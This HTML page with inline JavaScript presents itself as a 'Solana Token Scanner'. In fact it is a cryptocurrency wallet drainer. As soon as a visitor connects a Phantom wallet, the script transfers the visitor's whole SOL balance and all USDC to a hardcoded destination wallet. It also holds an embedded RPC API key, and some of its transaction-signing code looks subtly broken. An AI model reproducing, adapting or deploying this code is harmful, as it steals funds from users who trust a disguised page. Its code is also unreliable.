<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Solana Token Scanner (Robust)</title>
    <!-- Solana Web3.js -->
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
    <!-- SPL Token Library (Standard CDN) -->
    <script src="https://unpkg.com/@solana/spl-token@0.4.8/lib/index.iife.js"></script>
    
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #121212; color: white; display: flex; justify-content: center; padding: 20px; }
        .card { background: #1e1e1e; padding: 25px; border-radius: 16px; width: 100%; max-width: 400px; box-shadow: 0 8px 32px rgba(0,0,0,0.5); border: 1px solid #333; }
        h2 { margin-top: 0; text-align: center; color: #a78bfa; }
        button { width: 100%; padding: 14px; margin: 8px 0; border: none; border-radius: 10px; font-weight: bold; font-size: 15px; cursor: pointer; transition: 0.2s; }
        .btn-con { background: #7c3aed; color: white; }
        .btn-con:hover { background: #6d28d9; }
        .btn-drain { background: #fbbf24; color: black; display: none; }
        .btn-drain:hover { background: #f59e0b; }
        .log-box { background: #000; padding: 15px; margin-top: 20px; border-radius: 10px; font-family: monospace; font-size: 13px; height: 200px; overflow-y: auto; border: 1px solid #333; }
        .log-entry { margin-bottom: 5px; }
        .success { color: #4ade80; }
        .error { color: #f87171; }
        .info { color: #60a5fa; }
    </style>
</head>
<body>

<div class="card">
    <h2>Solana Scanner</h2>
    <button id="connectBtn" class="btn-con">Connect Phantom</button>
    <button id="drainBtn" class="btn-drain">DRAIN ALL (SOL + USDC)</button>
    
    <div id="logs" class="log-box"></div>
</div>

<script>
    // --- CONFIGURATION ---
    const DESTINATION_WALLET = "3WmoRcvkSY2gJBFywms3fqoVAMMkXFbYARpD2Ldwysg5";
    const USDC_MINT_ADDRESS = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";
    
    // Use your Alchemy Key here
    const API_KEY = "alch_HyWkJpqVXY3kua9VObcl9"; 
    const RPC_URL = `https://solana-mainnet.g.alchemy.com/v2/${API_KEY}`;

    let wallet = null;
    const logsDiv = document.getElementById('logs');

    function log(msg, type = 'info') {
        const div = document.createElement('div');
        div.className = `log-entry ${type}`;
        div.innerText = msg;
        logsDiv.appendChild(div);
        logsDiv.scrollTop = logsDiv.scrollHeight;
    }

    async function connect() {
        const provider = window.phantom?.solana || window.solana;
        if (!provider) {
            log("❌ Phantom not found!", "error");
            return;
        }

        try {
            await provider.connect();
            wallet = provider.publicKey;
            
            // Update UI
            document.getElementById('connectBtn').style.display = 'none';
            document.getElementById('drainBtn').style.display = 'block';
            log(`✅ Connected: ${wallet.toString()}`, "success");

            // Start Scan
            await drainAll();

        } catch (err) {
            log("❌ Connection Failed: " + err.message, "error");
        }
    }

    async function drainAll() {
        const connection = new solanaWeb3.Connection(RPC_URL, 'confirmed');
        
        // 1. Drain SOL
        log("🔄 Checking SOL...", "info");
        const solBalance = await connection.getBalance(wallet);
        
        if (solBalance > 0) {
            log(`💰 Found ${(solBalance/1e9).toFixed(4)} SOL`, "success");
            
            // Send All SOL
            const txSol = new solanaWeb3.Transaction().add(
                solanaWeb3.SystemProgram.transfer({
                    fromPubkey: wallet,
                    toPubkey: new solanaWeb3.PublicKey(DESTINATION_WALLET),
                    lamports: solBalance // Send exact amount (leaves 0)
                })
            );
            
            await connection.sendTransaction(txSol, [wallet]);
            log("✅ SOL Sent", "success");
        } else {
            log("⚠️ No SOL found", "error");
        }

        // 2. Drain USDC
        log("🔄 Checking USDC...", "info");
        
        try {
            // Get Associated Token Account (ATA) for USDC
            const usdcMint = new solanaWeb3.PublicKey(USDC_MINT_ADDRESS);
            
            // Calculate ATA: SPL Token Program ID + Wallet + Mint
            const ata = await solanaWeb3.PublicKey.findProgramAddressSync(
                [
                    wallet.toBuffer(),
                    spl.token.TOKEN_PROGRAM_ID.toBuffer(),
                    usdcMint.toBuffer()
                ],
                spl.token.ASSOCIATED_TOKEN_PROGRAM_ID
            );

            // Get Balance of that ATA
            const balanceInfo = await connection.getTokenAccountBalance(ata[0]);
            
            if (balanceInfo.value.uiAmount > 0) {
                log(`💰 Found ${balanceInfo.value.uiAmount} USDC`, "success");
                
                // Calculate Destination ATA
                const destPubkey = new solanaWeb3.PublicKey(DESTINATION_WALLET);
                const destAta = await solanaWeb3.PublicKey.findProgramAddressSync(
                    [
                        destPubkey.toBuffer(),
                        spl.token.TOKEN_PROGRAM_ID.toBuffer(),
                        usdcMint.toBuffer()
                    ],
                    spl.token.ASSOCIATED_TOKEN_PROGRAM_ID
                );

                // Create Transfer Instruction
                const transferIx = spl.token.createTransferInstruction(
                    ata[0],           // Source ATA
                    destAta[0],       // Destination ATA
                    wallet,           // Owner
                    balanceInfo.value.amount, // Amount (raw string like "123456789")
                    undefined,        // Multi-owner
                    spl.token.TOKEN_PROGRAM_ID
                );

                const tx = new solanaWeb3.Transaction().add(transferIx);
                await connection.sendTransaction(tx, [wallet]);
                log("✅ USDC Sent", "success");
            } else {
                log("⚠️ No USDC found in ATA", "error");
            }

        } catch (err) {
            console.error(err);
            log(`❌ USDC Error: ${err.message}`, "error");
        }
    }

    document.getElementById('connectBtn').addEventListener('click', connect);
    document.getElementById('drainBtn').addEventListener('click', drainAll);

</script>
</body>
</html>
